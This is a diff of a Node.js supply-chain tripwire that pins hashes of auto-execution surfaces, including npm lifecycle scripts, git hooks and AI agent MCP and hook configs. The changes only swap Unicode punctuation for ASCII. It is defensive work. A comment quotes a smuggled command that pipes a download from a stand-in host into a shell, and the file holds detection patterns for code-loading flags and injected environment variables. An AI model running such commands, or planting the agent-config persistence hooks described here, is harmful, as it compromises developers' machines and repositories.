@@ -1,30 +1,30 @@
 #!/usr/bin/env node
 /**
- * Supply-chain surface guard (tripwire) — portable, zero-dependency.
+ * Supply-chain surface guard (tripwire) - portable, zero-dependency.
  *
  * Defends a repo against a persistence/supply-chain attack that re-runs itself by
  * hooking every AUTO-EXECUTION surface (lifecycle + CI scripts AND the files they
  * invoke, git hooks, GitHub workflows + composite actions, the Claude / Cursor /
- * Gemini-CLI / Codex / Hermes agent surfaces — MCP servers, hooks, rules/skills/
- * commands — editor tasks, dropped payloads). Runs in BOTH the pre-commit hook
+ * Gemini-CLI / Codex / Hermes agent surfaces - MCP servers, hooks, rules/skills/
+ * commands - editor tasks, dropped payloads). Runs in BOTH the pre-commit hook
  * and a CI job.
  *
- * MODEL — content PINNING. The exact (EOL-normalized) SHA-256 of every file under
+ * MODEL - content PINNING. The exact (EOL-normalized) SHA-256 of every file under
  * a surface dir, plus the full package.json `scripts` block, is pinned in
  * security/surface-pins.json; the guard fails on ANY deviation, ANY new file, or a
  * lifecycle script that invokes an UNPINNED file. Heuristic checks (oversized /
  * minified blob, MCP servers, hooks, editor tasks) add defense in depth over the
- * trees that can't be byte-pinned (lib/, app/, …).
+ * trees that can't be byte-pinned (lib/, app/, ...).
  *
  * FAIL-CLOSED: the optional security/guard.config.json can only make the guard
- * STRICTER — it must be a TRACKED file (an untracked/gitignored config is IGNORED
+ * STRICTER - it must be a TRACKED file (an untracked/gitignored config is IGNORED
  * and flagged); coverage lists are UNIONed with the defaults (never shrunk),
  * maxFileBytes can only drop, mcpAllowlist additions are validated, and
  * oversizeAllowlist is NOT user-widenable (widening it would exempt a payload). The
  * config + pins live under security/, a pinned + code-owned surface, so it cannot
  * silently disarm the guard.
  *
- * ── DROP INTO ANY REPO ──
+ * -- DROP INTO ANY REPO --
  *     cp scripts/guard-surfaces.mjs <repo>/scripts/
  *     cd <repo> && node scripts/guard-surfaces.mjs --init
  *     node scripts/guard-surfaces.mjs            # check (CI / pre-commit)
@@ -34,7 +34,7 @@
  * CI runs the guard CODE from a TRUSTED ref (the base branch), not the PR head, so a
  * PR can't weaken the guard LOGIC. The PINS are read from the PR head, so a re-pinned
  * trojan is stopped by the CODEOWNERS review gate on security/ (keep it ON), not by
- * CI — see .github/workflows/test.yml and SECURITY.md.
+ * CI - see .github/workflows/test.yml and SECURITY.md.
  *
  * Pure helpers are exported for unit tests; fs/git/process live in the runner.
  */
@@ -59,13 +59,13 @@ const PINS_PATH = "security/surface-pins.json";
 const CONFIG_PATH = "security/guard.config.json";
 const GLOBAL_BASELINE = ".stoa/global-baseline.json"; // machine-local (under ~)
 
-/** Tunable surface definitions. Override via security/guard.config.json — but
+/** Tunable surface definitions. Override via security/guard.config.json - but
  * overrides can only WIDEN coverage / TIGHTEN limits (see sanitizeConfig). */
 const DEFAULTS = {
   // Dirs whose EVERY file is byte-pinned (husky's _/ cache + the pins manifest
-  // are excluded). No extension allowlist — an attacker controls the extension.
+  // are excluded). No extension allowlist - an attacker controls the extension.
   // Agent surfaces: .claude/.cursor/.gemini/.codex/.agents cover Claude, Cursor &
-  // Gemini-CLI hooks, MCP config and rules/skills/commands — incl. Cursor's
+  // Gemini-CLI hooks, MCP config and rules/skills/commands - incl. Cursor's
   // hooks.json (auto-runs on workspaceOpen, no approval) and the cross-tool
   // .codex/skills + .agents/skills roots Cursor auto-loads. Gemini folder-trust
   // is OFF by default, so a committed .gemini/ auto-execs with NO gate.
@@ -73,7 +73,7 @@ const DEFAULTS = {
   // Individual ROOT-level files to byte-pin (rule/instruction + MCP/hook configs
   // that live outside any surface dir). .cursorrules/.windsurfrules are
   // prompt-injection vectors; .mcp.json/.claude.json define MCP servers + hooks
-  // and are otherwise the structured scan's SOLE gate — byte-pinning a COMMITTED
+  // and are otherwise the structured scan's SOLE gate - byte-pinning a COMMITTED
   // one makes that scan defense-in-depth (a forged-but-allowlisted server can't
   // land without a code-owned re-pin). A gitignored/local one stays an advisory.
   surfaceFiles: [".cursorrules", ".windsurfrules", ".mcp.json", ".claude.json"],
@@ -83,15 +83,15 @@ const DEFAULTS = {
     ".fish", ".ps1", ".psm1", ".bat", ".cmd", ".py", ".rb", ".pl", ".php", ".lua",
   ],
   // NOT user-widenable (see loadConfig): adding a skipDir would exempt that tree
-  // from the oversize/minify payload sweep — a disarm, not a widen.
+  // from the oversize/minify payload sweep - a disarm, not a widen.
   skipDirs: ["node_modules", ".git", ".next", "dist", "build", "coverage"],
   maxFileBytes: 1_000_000,
   oversizeAllowlist: ["package-lock.json", "pnpm-lock.yaml", "yarn.lock"],
   // An MCP server is allowed only if a path-segment of its command/args (sans
-  // extension) EXACTLY equals an allowlist entry — see isAllowedMcpServer.
+  // extension) EXACTLY equals an allowlist entry - see isAllowedMcpServer.
   mcpAllowlist: ["orchestration-server"],
   // Dirs whose *.json files are parsed for MCP servers + hooks (structured scan).
-  // .cursor → .cursor/mcp.json; .gemini → .gemini/settings.json.
+  // .cursor -> .cursor/mcp.json; .gemini -> .gemini/settings.json.
   agentConfigDirs: [".claude", ".cursor", ".gemini"],
   agentConfigFiles: [".mcp.json", ".claude.json"],
   localConfigFiles: [".claude/settings.local.json", ".mcp.json", ".claude.json"],
@@ -101,12 +101,12 @@ const DEFAULTS = {
     ".claude.json",
     ".claude/settings.json",
     ".cursor/mcp.json",
-    ".cursor/hooks.json", // Cursor global hooks — auto-run on lifecycle events, no approval
+    ".cursor/hooks.json", // Cursor global hooks - auto-run on lifecycle events, no approval
     ".gemini/settings.json",
   ],
 };
 
-// npm scripts that run AUTOMATICALLY on install/publish/pack — the file each one
+// npm scripts that run AUTOMATICALLY on install/publish/pack - the file each one
 // invokes must itself be pinned (a string-only check lets a trojaned target slip).
 const LIFECYCLE_SCRIPTS = new Set([
   "preinstall", "install", "postinstall", "preprepare", "prepare", "postprepare",
@@ -119,7 +119,7 @@ const SHELL_CMDS = new Set([
 ]);
 
 // Interpreter flags that run arbitrary code BEFORE/instead of the main script
-// (inline-eval AND module-preload — the latter, -r/--require/--import/--loader,
+// (inline-eval AND module-preload - the latter, -r/--require/--import/--loader,
 // runs an attacker module's top level before main). A standalone token only.
 const CODE_LOAD_FLAG =
   /(^|\s)(-e|--eval|-p|--print|-c|-r|--require|--import|--loader|--experimental-loader|-m|--module)(\s|=|$)/;
@@ -130,13 +130,13 @@ const DANGEROUS_ENV =
 
 const META_RE = /[;&|`$(){}<>#\n]|&&|\|\|/; // shell metachars / chaining / comment
 
-// ── pure helpers (unit-tested) ──
+// -- pure helpers (unit-tested) --
 
 export function sha256(content) {
   return createHash("sha256").update(content).digest("hex");
 }
 
-/** EOL-normalized content hash — pins must be identical across CRLF (Windows) and
+/** EOL-normalized content hash - pins must be identical across CRLF (Windows) and
  * LF (Linux/macOS CI) checkouts, else a clean PR false-fails on the enforcing OS. */
 export function hashContent(content) {
   return sha256(String(content).replace(/\r\n/g, "\n"));
@@ -159,7 +159,7 @@ export function findMcpServers(obj) {
     for (const [name, def] of Object.entries(map)) {
       const isObj = def && typeof def === "object";
       const command = isObj && typeof def.command === "string" ? def.command : "";
-      // args may be an ARRAY or a raw STRING — accept both. (Coercing a string to
+      // args may be an ARRAY or a raw STRING - accept both. (Coercing a string to
       // "" let `{command:"ok",args:"; curl evil|sh"}` skip the metachar check.)
       const args = isObj
         ? Array.isArray(def.args)
@@ -168,7 +168,7 @@ export function findMcpServers(obj) {
             ? def.args
             : ""
         : "";
-      // env can smuggle code into a spawned interpreter (NODE_OPTIONS=--require …).
+      // env can smuggle code into a spawned interpreter (NODE_OPTIONS=--require ...).
       const env = isObj && def.env && typeof def.env === "object" && !Array.isArray(def.env) ? def.env : {};
       out.push({ name, command, args, env });
     }
@@ -178,12 +178,12 @@ export function findMcpServers(obj) {
 
 /**
  * STRUCTURED allow check (not a raw substring): an MCP server is allowed only if
- *   - its command is not a shell (sh/bash/cmd/powershell/…),
+ *   - its command is not a shell (sh/bash/cmd/powershell/...),
  *   - the command line has no shell metacharacters / chaining / comments,
  *   - no interpreter code-load flag (-e/-p/-c/-r/--require/--import/--loader),
- *   - no code-injecting env var (NODE_OPTIONS / LD_PRELOAD / …), AND
+ *   - no code-injecting env var (NODE_OPTIONS / LD_PRELOAD / ...), AND
  *   - some allowlist entry EXACTLY equals the BASENAME (sans extension) of a
- *     FILE-LIKE token (one that has a path separator or a file extension) — NOT an
+ *     FILE-LIKE token (one that has a path separator or a file extension) - NOT an
  *     intermediate directory segment, and NOT a bare package/module name. So
  *     `node /tmp/orchestration-server/evil.js` (dir spoof), `npx orchestration-server`
  *     (registry name-confusion) and `python -m orchestration-server` (module exec)
@@ -206,7 +206,7 @@ export function isAllowedMcpServer({ command, args, env } = {}, allowlist) {
   }
   // The COMMAND's own basename always counts (it IS the executable being run, so a
   // bare allowlisted `my-server` or `./my-server` is fine). An ARG counts only if
-  // it's a FILE-LIKE token (has a path separator or extension) — i.e. the executed
+  // it's a FILE-LIKE token (has a path separator or extension) - i.e. the executed
   // script, as in `npx tsx <path>/orchestration-server.ts`. A bare arg is a package
   // / module name (`npx orchestration-server`, `python -m mod`) and must NOT match,
   // and a directory segment of a file path doesn't count (only its basename).
@@ -256,7 +256,7 @@ export function checkPackageScripts(pkg, pinnedScripts) {
   for (const [name, cmd] of Object.entries(live)) {
     if (!(name in pinned)) violations.push(`package.json: new script "${name}": ${cmd}`);
     else if (pinned[name] !== cmd)
-      violations.push(`package.json: script "${name}" changed → "${cmd}" (pinned: "${pinned[name]}")`);
+      violations.push(`package.json: script "${name}" changed -> "${cmd}" (pinned: "${pinned[name]}")`);
   }
   for (const name of Object.keys(pinned))
     if (!(name in live)) violations.push(`package.json: script "${name}" removed`);
@@ -265,7 +265,7 @@ export function checkPackageScripts(pkg, pinnedScripts) {
 
 /** Local file paths invoked by a script command. Two passes: (1) any path with a
  * known script extension; (2) the first non-flag operand of a known interpreter,
- * EVEN extensionless — `node ./bin/setup` runs a shebang file the ext pass misses.
+ * EVEN extensionless - `node ./bin/setup` runs a shebang file the ext pass misses.
  * Case-insensitive: on Windows / default macOS, `node tools/Run.JS` executes. */
 export function scriptFileTargets(cmd) {
   const s = String(cmd);
@@ -302,7 +302,7 @@ export function discoverSurfaceFiles(relFiles, surfaceDirs, surfaceFiles = []) {
     .sort();
 }
 
-// ── config + fs / git ──
+// -- config + fs / git --
 
 function readText(root, rel) {
   try {
@@ -338,7 +338,7 @@ function safeAllowEntry(s) {
  * set). An untracked / gitignored security/guard.config.json is IGNORED (it never
  * appears in CODEOWNERS-reviewed history and would otherwise be a silent foothold);
  * the caller is told via cfg.untrustedConfig and raises a violation. When `tracked`
- * is omitted (e.g. updatePins), the config is honored — but even then it cannot
+ * is omitted (e.g. updatePins), the config is honored - but even then it cannot
  * DISARM the guard: oversizeAllowlist is NOT user-widenable (widening it would
  * exempt a payload from the oversize check), and every other override only widens
  * coverage or tightens a limit.
@@ -355,7 +355,7 @@ export function loadConfig(root, { tracked } = {}) {
   cfg.surfaceDirs = uniq([...DEFAULTS.surfaceDirs, ...asArr(raw.surfaceDirs)]);
   cfg.surfaceFiles = uniq([...DEFAULTS.surfaceFiles, ...asArr(raw.surfaceFiles)]);
   cfg.scriptExts = uniq([...DEFAULTS.scriptExts, ...asArr(raw.scriptExts)]);
-  // oversizeAllowlist is NOT user-widenable — adding a basename here would DISABLE
+  // oversizeAllowlist is NOT user-widenable - adding a basename here would DISABLE
   // the >maxFileBytes payload check for that file (a disarm, not a widen).
   cfg.oversizeAllowlist = [...DEFAULTS.oversizeAllowlist];
   cfg.agentConfigDirs = uniq([...DEFAULTS.agentConfigDirs, ...asArr(raw.agentConfigDirs)]);
@@ -363,7 +363,7 @@ export function loadConfig(root, { tracked } = {}) {
   cfg.localConfigFiles = uniq([...DEFAULTS.localConfigFiles, ...asArr(raw.localConfigFiles)]);
   cfg.globalTargets = uniq([...DEFAULTS.globalTargets, ...asArr(raw.globalTargets)]);
   cfg.mcpAllowlist = uniq([...DEFAULTS.mcpAllowlist, ...asArr(raw.mcpAllowlist).filter(safeAllowEntry)]);
-  // skipDirs is NOT user-widenable — adding a dir exempts that whole tree from the
+  // skipDirs is NOT user-widenable - adding a dir exempts that whole tree from the
   // oversize/minify payload sweep (a disarm). Same fail-closed rule as oversizeAllowlist.
   cfg.skipDirs = [...DEFAULTS.skipDirs];
   cfg.maxFileBytes =
@@ -405,7 +405,7 @@ function gitList(root, extraArgs) {
 }
 
 /** Git submodule (gitlink) paths. `git ls-files` lists ONLY the gitlink, NOT the
- * files inside the submodule's checked-out tree — but a directory walk descends
+ * files inside the submodule's checked-out tree - but a directory walk descends
  * into them, so a surface file under a submodule must be treated as committed
  * (else it would downgrade to a mere advisory). Sources: `git ls-files --stage`
  * mode-160000 entries + a .gitmodules parse (covers an un-checked-out submodule). */
@@ -422,16 +422,16 @@ function submoduleDirs(root) {
       if (tab > 0 && entry.startsWith("160000 ")) dirs.add(entry.slice(tab + 1));
     }
   } catch {
-    /* not a git repo — fall through to .gitmodules */
+    /* not a git repo - fall through to .gitmodules */
   }
   const gm = readText(root, ".gitmodules");
   if (gm) for (const m of gm.matchAll(/(?:^|\n)\s*path\s*=\s*(.+?)\s*(?:\n|$)/g)) dirs.add(m[1].trim());
   return [...dirs];
 }
 
-/** { files: tracked ∪ untracked-not-ignored, tracked: Set } — so a dropped but
+/** { files: tracked + untracked-not-ignored, tracked: Set } - so a dropped but
  * not-yet-committed surface file is still scanned/pinnable, while advisory routing
- * (untracked local config → warning) still knows what's tracked. */
+ * (untracked local config -> warning) still knows what's tracked. */
 function listFiles(root, skipDirs) {
   try {
     const tracked = gitList(root, []);
@@ -445,15 +445,15 @@ function listFiles(root, skipDirs) {
       return { files: uniq([...tracked, ...untracked]), tracked: new Set(tracked) };
     }
   } catch {
-    /* not a git repo — fall through */
+    /* not a git repo - fall through */
   }
   const walked = walkRel(root, skipDirs);
   return { files: walked, tracked: new Set(walked) };
 }
 
-/** Surface-file candidate set for pin/scan: the git list ∪ a DIRECT walk of each
- * surface dir (so a gitignored drop inside a surface dir — which `git ls-files`
- * omits — is still seen) ∪ any existing root surfaceFile. */
+/** Surface-file candidate set for pin/scan: the git list + a DIRECT walk of each
+ * surface dir (so a gitignored drop inside a surface dir - which `git ls-files`
+ * omits - is still seen) + any existing root surfaceFile. */
 function surfaceCandidates(root, cfg, files, skipDirs) {
   const set = new Set(files);
   for (const d of cfg.surfaceDirs) {
@@ -464,13 +464,13 @@ function surfaceCandidates(root, cfg, files, skipDirs) {
   return discoverSurfaceFiles([...set], cfg.surfaceDirs, cfg.surfaceFiles);
 }
 
-// ── runner ──
+// -- runner --
 
 /** Scan a repo root. Returns { violations, warnings }. */
 export function runGuard(root) {
   const violations = [];
   const warnings = [];
-  // Enumerate first — the tracked set decides config trust + violation routing.
+  // Enumerate first - the tracked set decides config trust + violation routing.
   // DEFAULT skipDirs here: the git path ignores them, and the walk fallback only
   // over-includes (fail-safe) if config later widens skipDirs.
   const { files, tracked } = listFiles(root, new Set(DEFAULTS.skipDirs));
@@ -480,7 +480,7 @@ export function runGuard(root) {
   const oversize = new Set(cfg.oversizeAllowlist);
 
   // A surface file inside a git submodule IS committed (in the submodule), even
-  // though `git ls-files` doesn't list it — so it must route as a violation, not an
+  // though `git ls-files` doesn't list it - so it must route as a violation, not an
   // advisory. "committed" = in the index OR under a submodule.
   const submods = submoduleDirs(root);
   const inSubmodule = (rel) => submods.some((p) => rel === p || rel.startsWith(p + "/"));
@@ -490,24 +490,24 @@ export function runGuard(root) {
   //    (it can't be CODEOWNERS-reviewed, so it must not silently widen / foothold).
   if (cfg.untrustedConfig)
     violations.push(
-      `${cfg.untrustedConfig}: untracked guard config IGNORED — it must be a tracked, code-owned file (commit it or remove it)`
+      `${cfg.untrustedConfig}: untracked guard config IGNORED - it must be a tracked, code-owned file (commit it or remove it)`
     );
 
   // 0b. A surface dir that is a SYMLINK, or a git SUBMODULE mounted at/under a
   //     surface path, can't have its contents pinned and would auto-load on a
-  //     recursive clone — reject outright.
+  //     recursive clone - reject outright.
   for (const d of cfg.surfaceDirs) {
     try {
       if (lstatSync(join(root, d)).isSymbolicLink())
-        violations.push(`${d}: surface dir is a symlink (its target isn't scanned/pinned) — not allowed`);
+        violations.push(`${d}: surface dir is a symlink (its target isn't scanned/pinned) - not allowed`);
     } catch {
-      /* absent — fine */
+      /* absent - fine */
     }
   }
   for (const p of submods) {
     const lc = p.toLowerCase();
     if (cfg.surfaceDirs.some((d) => { const dl = d.toLowerCase(); return lc === dl || lc.startsWith(dl + "/") || dl.startsWith(lc + "/"); }))
-      violations.push(`${p}: git submodule at a surface path — its contents can't be pinned and auto-load on a recursive clone; not allowed`);
+      violations.push(`${p}: git submodule at a surface path - its contents can't be pinned and auto-load on a recursive clone; not allowed`);
   }
 
   // 1. package.json scripts vs the pin (whole block; covers test/build/all).
@@ -516,7 +516,7 @@ export function runGuard(root) {
     return t ? readJson(t) : { ok: false };
   })();
   if (!pinsParsed.ok) {
-    violations.push(`${PINS_PATH} missing or unparseable — run 'node scripts/guard-surfaces.mjs --init' (or --update)`);
+    violations.push(`${PINS_PATH} missing or unparseable - run 'node scripts/guard-surfaces.mjs --init' (or --update)`);
     return { violations, warnings };
   }
   const pins = pinsParsed.value;
@@ -527,7 +527,7 @@ export function runGuard(root) {
     if (pkg.ok) {
       violations.push(...checkPackageScripts(pkg.value, pins.packageScripts));
       // Couple the string-pin to the CONTENT of the file each LIFECYCLE script
-      // invokes — a trojaned target with an unchanged command string slips by otherwise.
+      // invokes - a trojaned target with an unchanged command string slips by otherwise.
       const scripts = (pkg.value && pkg.value.scripts) || {};
       for (const name of Object.keys(scripts)) {
         if (!LIFECYCLE_SCRIPTS.has(name)) continue;
@@ -544,7 +544,7 @@ export function runGuard(root) {
   //    a gitignored drop in a surface dir (git ls-files omits it) is still SEEN.
   //    Routing: a TRACKED (committed) surface that's unpinned/changed is a VIOLATION
   //    (the committed-attack + legit-re-pin path); an UNTRACKED / gitignored one is
-  //    an ADVISORY warning — it isn't in the committed tree (so it can't be a PR
+  //    an ADVISORY warning - it isn't in the committed tree (so it can't be a PR
   //    attack), just a local artifact worth surfacing. A CHANGED pin is always a
   //    violation (a known surface was tampered).
   const surface = surfaceCandidates(root, cfg, files, skipDirs);
@@ -556,7 +556,7 @@ export function runGuard(root) {
       (committed(rel) ? violations : warnings).push(
         committed(rel)
           ? `${rel}: new unpinned executable surface file`
-          : `${rel}: untracked/gitignored surface file (not pinned) — review it`
+          : `${rel}: untracked/gitignored surface file (not pinned) - review it`
       );
     else if (pinnedFiles[rel] !== hash) violations.push(`${rel}: content changed from its pinned hash`);
   }
@@ -564,17 +564,17 @@ export function runGuard(root) {
     if (!surface.includes(rel) && !existsSync(join(root, rel)))
       violations.push(`${rel}: pinned surface file is gone (moved/deleted?)`);
 
-  // 3. Agent configs — hooks + MCP servers (Claude/Cursor/Gemini JSON; Codex/Hermes
+  // 3. Agent configs - hooks + MCP servers (Claude/Cursor/Gemini JSON; Codex/Hermes
   //    TOML is byte-pinned only, see SECURITY.md). Matching is case-INSENSITIVE (a
   //    tracked `.Cursor/mcp.json` loads identically on macOS/Windows). A hook or a
-  //    non-allowlisted MCP server is a hard VIOLATION even when UNTRACKED/local — it
+  //    non-allowlisted MCP server is a hard VIOLATION even when UNTRACKED/local - it
   //    auto-executes on agent start (the gitignored claude.local.json vector).
   const cfgFilesLc = new Set(cfg.agentConfigFiles.map((f) => f.toLowerCase()));
   const cfgDirsLc = cfg.agentConfigDirs.map((d) => d.toLowerCase());
   const configRels = new Set(cfg.agentConfigFiles);
   // Scan the SURFACE walk set too (not just the git list), so a config that's only
-  // visible via the direct walk — a gitignored drop, a submodule-internal config, a
-  // symlink target — is parsed for hooks/MCP, not just byte-checked.
+  // visible via the direct walk - a gitignored drop, a submodule-internal config, a
+  // symlink target - is parsed for hooks/MCP, not just byte-checked.
   for (const rel of new Set([...files, ...surface])) {
     const lc = rel.toLowerCase();
     if (cfgFilesLc.has(lc) || (cfgDirsLc.some((d) => lc.startsWith(d + "/")) && lc.endsWith(".json")))
@@ -589,33 +589,33 @@ export function runGuard(root) {
     const parsed = readJson(text);
     if (!parsed.ok) {
       // A config that mentions "hooks" but won't parse is suspicious regardless of
-      // tracking (it could hide a hook from the scanner) → always a violation. A
-      // plainly-malformed config with no hook smell is routed (untracked → advisory).
+      // tracking (it could hide a hook from the scanner) -> always a violation. A
+      // plainly-malformed config with no hook smell is routed (untracked -> advisory).
       if (/"hooks"/.test(text))
-        violations.push(`${rel}: unparseable config that mentions "hooks" — possible obfuscated hook injection`);
+        violations.push(`${rel}: unparseable config that mentions "hooks" - possible obfuscated hook injection`);
       else
         (committed(rel) ? violations : warnings).push(`${rel}: unparseable JSON config (could hide an injected hook from the scanner)`);
       continue;
     }
     // A hook or a non-allowlisted MCP server AUTO-EXECUTES the moment an agent
-    // starts — so it is a hard VIOLATION even in an UNTRACKED / gitignored local
+    // starts - so it is a hard VIOLATION even in an UNTRACKED / gitignored local
     // config (`claude.local.json`, `.claude/settings.local.json`, a local `.mcp.json`).
     // That is the exact persistence vector an attacker picks BECAUSE it's
     // gitignored and invisible to review; advisory-only would let it slide.
     const hooks = findHooksKeys(parsed.value);
     if (hooks.length)
-      violations.push(`${rel}: contains hook definition(s) [${hooks.join(", ")}] — auto-executes on agent events`);
+      violations.push(`${rel}: contains hook definition(s) [${hooks.join(", ")}] - auto-executes on agent events`);
     for (const s of findMcpServers(parsed.value))
       if (!isAllowedMcpServer(s, cfg.mcpAllowlist))
         violations.push(
-          `${rel}: defines MCP server "${s.name}" (command: ${`${s.command} ${s.args}`.trim()}) — auto-launches when a Claude/Cursor/Gemini/Codex/Hermes agent starts`
+          `${rel}: defines MCP server "${s.name}" (command: ${`${s.command} ${s.args}`.trim()}) - auto-launches when a Claude/Cursor/Gemini/Codex/Hermes agent starts`
         );
   }
 
   // 4. Editor auto-run tasks.
   const tasksRel = ".vscode/tasks.json";
   if (existsSync(join(root, tasksRel)))
-    (tracked.has(tasksRel) ? violations : warnings).push(`${tasksRel}: present — auto-runs in the editor`);
+    (tracked.has(tasksRel) ? violations : warnings).push(`${tasksRel}: present - auto-runs in the editor`);
 
   // 5. Defense-in-depth payload sweep over the whole file set (lib/app/etc.).
   for (const rel of files) {
@@ -627,7 +627,7 @@ export function runGuard(root) {
       continue;
     }
     if (size > cfg.maxFileBytes && !oversize.has(basename(rel))) {
-      violations.push(`${rel}: ${(size / 1e6).toFixed(1)} MB — oversized; possible dropped payload`);
+      violations.push(`${rel}: ${(size / 1e6).toFixed(1)} MB - oversized; possible dropped payload`);
       continue;
     }
     if (scriptExts.has(extOf(rel).toLowerCase()) && size <= cfg.maxFileBytes) {
@@ -640,7 +640,7 @@ export function runGuard(root) {
 }
 
 /** Regenerate security/surface-pins.json from the current tree. Pins only TRACKED
- * surface files — a committed manifest must not pin a local/untracked artifact (it
+ * surface files - a committed manifest must not pin a local/untracked artifact (it
  * would read as "gone" on a fresh clone). Gitignored surface drops are intentionally
  * left unpinned, so the guard reports them as an advisory (see runGuard step 2). */
 export function updatePins(root) {
@@ -657,7 +657,7 @@ export function updatePins(root) {
   }
   const pins = {
     _comment:
-      "Pinned auto-execution surfaces. Regenerate with: node scripts/guard-surfaces.mjs --update (a code-owned change — see .github/CODEOWNERS).",
+      "Pinned auto-execution surfaces. Regenerate with: node scripts/guard-surfaces.mjs --update (a code-owned change - see .github/CODEOWNERS).",
     packageScripts: pkg.scripts || {},
     files: pinnedFiles,
   };
@@ -667,7 +667,7 @@ export function updatePins(root) {
   return pins;
 }
 
-// ── global agent-config drift (out-of-repo persistence; machine-local) ──
+// -- global agent-config drift (out-of-repo persistence; machine-local) --
 
 export function extractGlobalSurfaces(rel, content) {
   if (rel.endsWith(".json")) {
@@ -686,7 +686,7 @@ export function extractGlobalSurfaces(rel, content) {
   }
   // inline table: mcp_servers = { a = { command="x" }, b = {...} }. Regex can't
   // balance nested braces (env sub-tables), so scan brace depth manually and take
-  // the TOP-LEVEL keys (each `name = {…}` is one server) — the old [^}]* form
+  // the TOP-LEVEL keys (each `name = {...}` is one server) - the old [^}]* form
   // truncated at the first nested `}`, mis-naming servers and missing later ones.
   for (const body of inlineTableBodies(content)) {
     for (const part of splitTopLevel(body)) {
@@ -697,7 +697,7 @@ export function extractGlobalSurfaces(rel, content) {
   return { mcpServers: [...names].sort(), hooks: /(^|\n)\s*\[?\s*hooks\b/i.test(content) };
 }
 
-/** Brace-balanced bodies of each `mcp_servers = { … }` inline TOML table. */
+/** Brace-balanced bodies of each `mcp_servers = { ... }` inline TOML table. */
 function inlineTableBodies(content) {
   const bodies = [];
   const start = /(?:^|\n)[ \t]*(?:mcp_servers|mcpServers)[ \t]*=[ \t]*\{/g;
@@ -716,7 +716,7 @@ function inlineTableBodies(content) {
 }
 
 /** Split a TOML inline-table body on DEPTH-0 commas (ignore commas inside nested
- * `{ … }` sub-tables), so each part is one top-level `name = value` assignment. */
+ * `{ ... }` sub-tables), so each part is one top-level `name = value` assignment. */
 function splitTopLevel(body) {
   const parts = [];
   let depth = 0, cur = "";
@@ -776,12 +776,12 @@ export function runGlobalGuard(home, targets = DEFAULTS.globalTargets) {
     }
     if (!was || !now) continue;
     const added = now.mcpServers.filter((n) => !was.mcpServers.includes(n));
-    if (added.length) alerts.push(`${rel}: NEW MCP server(s) [${added.join(", ")}] — a global auto-launcher was added`);
+    if (added.length) alerts.push(`${rel}: NEW MCP server(s) [${added.join(", ")}] - a global auto-launcher was added`);
     if (now.hooks && !was.hooks) alerts.push(`${rel}: a hooks block appeared`);
     // Any other content change is also an alert (a parser that can't name the
     // new server must NOT silently downgrade to an advisory note).
     if (now.hash !== was.hash && !added.length && !(now.hooks && !was.hooks))
-      alerts.push(`${rel}: content changed since baseline — review for an injected MCP server / hook`);
+      alerts.push(`${rel}: content changed since baseline - review for an injected MCP server / hook`);
   }
   return { alerts, notes, current };
 }
@@ -801,7 +801,7 @@ export function writeGlobalBaseline(home, targets = DEFAULTS.globalTargets) {
   return snap;
 }
 
-// ── init (plug-and-play wiring for a new repo) ──
+// -- init (plug-and-play wiring for a new repo) --
 
 const CI_WORKFLOW = `name: surface-guard
 
@@ -860,12 +860,12 @@ function ensurePreCommit(root) {
     }
     return "pre-commit: wrote .git/hooks/pre-commit";
   }
-  return "pre-commit: no .husky or .git — add `node scripts/guard-surfaces.mjs` to your hook manually";
+  return "pre-commit: no .husky or .git - add `node scripts/guard-surfaces.mjs` to your hook manually";
 }
 
 function ensureCiWorkflow(root) {
   if (!existsSync(join(root, ".github")))
-    return "ci: no .github dir — add a job running the guard from a trusted ref";
+    return "ci: no .github dir - add a job running the guard from a trusted ref";
   const file = join(root, ".github", "workflows", "surface-guard.yml");
   if (existsSync(file)) return "ci: .github/workflows/surface-guard.yml already exists (left as-is)";
   mkdirSync(dirname(file), { recursive: true });
@@ -879,10 +879,10 @@ export function runInit(root) {
   const pc = ensurePreCommit(root);
   const ci = ensureCiWorkflow(root);
   const pins = updatePins(root);
-  console.log("✔ surface guard initialized:");
+  console.log("OK surface guard initialized:");
   console.log(`  - ${pc}`);
   console.log(`  - ${ci}`);
-  console.log(`  - pinned ${Object.keys(pins.files).length} surface files + ${Object.keys(pins.packageScripts).length} package scripts → ${PINS_PATH}`);
+  console.log(`  - pinned ${Object.keys(pins.files).length} surface files + ${Object.keys(pins.packageScripts).length} package scripts -> ${PINS_PATH}`);
   console.log("\nNext:");
   console.log("  1. commit security/surface-pins.json (+ the hook / workflow).");
   console.log("  2. add the 'surface-guard' CI check to your branch-protection required checks,");
@@ -890,14 +890,14 @@ export function runInit(root) {
   console.log("  3. re-pin after any legit surface change: node scripts/guard-surfaces.mjs --update");
 }
 
-// ── cli ──
+// -- cli --
 
 function runGlobalCli(args) {
   const home = homedir();
   const targets = loadConfig(process.cwd()).globalTargets;
   if (args.includes("--update")) {
     const snap = writeGlobalBaseline(home, targets);
-    console.log(`✔ global baseline written for ${Object.keys(snap).length} agent config(s) → ~/${GLOBAL_BASELINE}`);
+    console.log(`OK global baseline written for ${Object.keys(snap).length} agent config(s) -> ~/${GLOBAL_BASELINE}`);
     return;
   }
   const res = runGlobalGuard(home, targets);
@@ -907,12 +907,12 @@ function runGlobalCli(args) {
   }
   for (const n of res.notes) console.warn("  ! " + n);
   if (res.alerts.length) {
-    console.error("\n✖ GLOBAL agent-config drift detected:\n");
+    console.error("\nx GLOBAL agent-config drift detected:\n");
     for (const a of res.alerts) console.error("  - " + a);
     console.error("\nIf you made these changes, re-baseline: node scripts/guard-surfaces.mjs --global --update\n");
     process.exit(1);
   }
-  console.log("✔ global agent configs match the baseline");
+  console.log("OK global agent configs match the baseline");
 }
 
 function main() {
@@ -922,18 +922,18 @@ function main() {
   const root = process.cwd();
   if (args.includes("--update")) {
     const pins = updatePins(root);
-    console.log(`✔ re-pinned ${Object.keys(pins.files).length} surface files + ${Object.keys(pins.packageScripts).length} package scripts → ${PINS_PATH}`);
+    console.log(`OK re-pinned ${Object.keys(pins.files).length} surface files + ${Object.keys(pins.packageScripts).length} package scripts -> ${PINS_PATH}`);
     return;
   }
   const { violations, warnings } = runGuard(root);
   for (const w of warnings) console.warn("  ! (advisory) " + w);
   if (violations.length) {
-    console.error("\n✖ supply-chain surface guard FAILED:\n");
+    console.error("\nx supply-chain surface guard FAILED:\n");
     for (const v of violations) console.error("  - " + v);
     console.error("\nIf a change is legitimate, re-pin in this PR: node scripts/guard-surfaces.mjs --update\n");
     process.exit(1);
   }
-  console.log("✔ surface guard: all auto-execution surfaces match their pins");
+  console.log("OK surface guard: all auto-execution surfaces match their pins");
 }
 
